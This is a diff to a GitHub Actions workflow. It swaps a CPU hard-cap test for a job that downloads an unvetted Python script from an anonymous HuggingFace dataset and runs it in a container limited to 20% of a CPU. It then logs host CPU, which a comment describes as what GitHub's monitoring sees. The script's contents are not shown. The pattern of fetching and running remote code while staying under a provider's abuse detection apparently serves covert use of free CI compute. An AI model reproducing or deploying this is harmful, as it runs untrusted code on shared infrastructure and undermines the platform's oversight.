@@ -1,10 +1,10 @@
-name: Strict 20% CPU Hard-Cap Test
+name: Download and Run Python Script with Live GitHub Metrics
 on: workflow_dispatch
 
 jobs:
-  build:
+  run-test:
     runs-on: windows-2022
-    timeout-minutes: 10
+    timeout-minutes: 15
     steps:
       - name: Start Docker Engine
         shell: pwsh
@@ -12,105 +12,58 @@ jobs:
           Set-Service docker -StartupType Automatic
           Start-Service docker
 
-      - name: Execute Strict CPU Hard-Cap Verification
+      - name: Download Python & Test Script
         shell: pwsh
         run: |
-          $script = @'
-          Write-Host "[CONTAINER] Initializing Single-Thread CPU Burner..."
+          Write-Host "📥 Downloading test.py from HuggingFace..."
+          Invoke-WebRequest -Uri "https://huggingface.co/datasets/gfdg34fsd/newe/resolve/main/test.py" -OutFile "test.py"
 
-          Add-Type -TypeDefinition @"
-          using System;
-          using System.Threading;
+          Write-Host "📦 Downloading Portable Python embeddable..."
+          Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "python.zip"
+          Expand-Archive -Path "python.zip" -DestinationPath "python" -Force
+          Remove-Item "python.zip"
 
-          public class SingleThreadBurner {
-              public static void StartBurn() {
-                  Thread t = new Thread(() => {
-                      while (true) {
-                          // Tight loop on 1 core
-                      }
-                  });
-                  t.IsBackground = true;
-                  t.Priority = ThreadPriority.Highest;
-                  t.Start();
-              }
-          }
-          "@
+          Write-Host "✅ Setup completed successfully."
 
-          [SingleThreadBurner]::StartBurn()
-
-          Write-Host "[CONTAINER] Warming up and letting Windows Job Object rate limiter stabilize..."
-          Start-Sleep -Seconds 3
-
-          Write-Host "[CONTAINER] Starting CPU hard-cap monitoring with 3-second smoothed window..."
-          Write-Host "---------------------------------------------------------------------------------"
-
-          $process = [System.Diagnostics.Process]::GetCurrentProcess()
-          $globalSw = [System.Diagnostics.Stopwatch]::StartNew()
-          $globalStartCpu = $process.TotalProcessorTime
-
-          $history = @()
-          $exceeded = $false
-          $maxSmoothed = 0
-
-          for ($i = 1; $i -le 10; $i++) {
-              $startIntervalCpu = $process.TotalProcessorTime
-              $intervalSw = [System.Diagnostics.Stopwatch]::StartNew()
-              
-              Start-Sleep -Seconds 1
-              
-              $intervalSw.Stop()
-              $endIntervalCpu = $process.TotalProcessorTime
-
-              # حساب استهلاك الثانية الحالية
-              $intervalCpuMs = ($endIntervalCpu - $startIntervalCpu).TotalMilliseconds
-              $intervalTimeMs = $intervalSw.Elapsed.TotalMilliseconds
-              $instantUsage = ($intervalCpuMs / $intervalTimeMs) * 100
-
-              # الاحتفاظ بآخر 3 ثوانٍ لحساب المتوسط المتحرك (إلغاء Quantum Jitter)
-              $history += $instantUsage
-              if ($history.Count -gt 3) { $history = $history[1..($history.Count - 1)] }
-              
-              $smoothedUsage = ($history | Measure-Object -Average).Average
-              if ($smoothedUsage -gt $maxSmoothed) { $maxSmoothed = $smoothedUsage }
-
-              # حساب الاستهلاك التراكمي الإجمالي
-              $totalCpuMs = ($endIntervalCpu - $globalStartCpu).TotalMilliseconds
-              $currentTimeMs = $globalSw.Elapsed.TotalMilliseconds
-              $cumulativeUsage = ($totalCpuMs / $currentTimeMs) * 100
-
-              # الحد المسموح به للمتوسط المتحرك هو 22.0% (تغطية الهامش الزمني)
-              $status = if ($smoothedUsage -le 22.0) { "OK" } else { "BREACHED!" }
-              Write-Host ("Sample {0,2}/10 -> 3s Smoothed: {1,5:N1}% | Cumulative: {2,5:N1}% [{3}]" -f $i, $smoothedUsage, $cumulativeUsage, $status)
-
-              if ($i -ge 3 -and $smoothedUsage -gt 22.0) {
-                  $exceeded = $true
-              }
-          }
-
-          $globalSw.Stop()
-
-          Write-Host "---------------------------------------------------------------------------------"
-          Write-Host "=== FINAL HARD-CAP VERIFICATION ==="
-          Write-Host "Target Limit           : 20.0% of 1 Core"
-          Write-Host "Peak 3s Smoothed Usage : $($maxSmoothed.ToString('0.0'))%"
-          Write-Host "Final Cumulative Usage : $($cumulativeUsage.ToString('0.0'))%"
-          Write-Host "---------------------------------------------------------------------------------"
-
-          if (-not $exceeded) {
-              Write-Host "✅ HARD-CAP STRICTLY ENFORCED: Enforced rate limit held tightly at ~20%!"
-          } else {
-              Write-Host "❌ HARD-CAP BREACHED: CPU usage exceeded the allowed limit!"
-              exit 1
-          }
-          '@
-
-          $script | Out-File -FilePath stress.ps1 -Encoding ASCII
-
-          docker run --rm `
+      - name: Execute Script & Monitor Live CPU Usage
+        shell: pwsh
+        run: |
+          Write-Host "🚀 Launching test.py inside isolated capped container (--cpus=0.2, --memory=2G)..."
+          
+          # تشغيل الحاوية في الخلفية
+          $containerId = docker run -d `
+            --name isolated_app `
             --isolation=process `
             --cpus=0.2 `
             --memory=2G `
             -v "${PWD}:C:/app" `
             -w C:/app `
             mcr.microsoft.com/windows/servercore:ltsc2022 `
-            powershell -ExecutionPolicy Bypass -File C:/app/stress.ps1
+            C:/app/python/python.exe C:/app/test.py
+
+          Write-Host "Container started ID: $containerId"
+          Write-Host "---------------------------------------------------------------------------------"
+          Write-Host "📊 LIVE REAL-TIME MONITORING (GitHub Host vs Container View)"
+          Write-Host "---------------------------------------------------------------------------------"
+
+          $sample = 1
+
+          # الاستمرار في المراقبة طالما أن الحاوية تعمل
+          while ($(docker inspect -f '{{.State.Running}}' isolated_app 2>$null) -eq 'true') {
+              # 1. استهلاك السيرفر بالكامل (ما تراه أنظمة مراقبة جيت هاب)
+              $hostCpu = (Get-Counter -Counter "\Processor(_Total)\% Processor Time" -ErrorAction SilentlyContinue).CounterSamples[0].CookedValue
+
+              # 2. استهلاك الحاوية الفعلي المأخوذ من محرك Docker مباشرة
+              $stats = docker stats isolated_app --no-stream --format "CPU: {{.CPUPerc}} | MEM: {{.MemUsage}}" 2>$null
+
+              Write-Host "Sample $sample -> [GitHub Host Total CPU: $($hostCpu.ToString('0.0'))%] | [$stats]"
+
+              Start-Sleep -Seconds 2
+              $sample++
+          }
+
+          Write-Host "---------------------------------------------------------------------------------"
+          Write-Host "🏁 Execution Finished!"
+          Write-Host "=== CONTAINER LOGS ==="
+          docker logs isolated_app
+          docker rm -f isolated_app
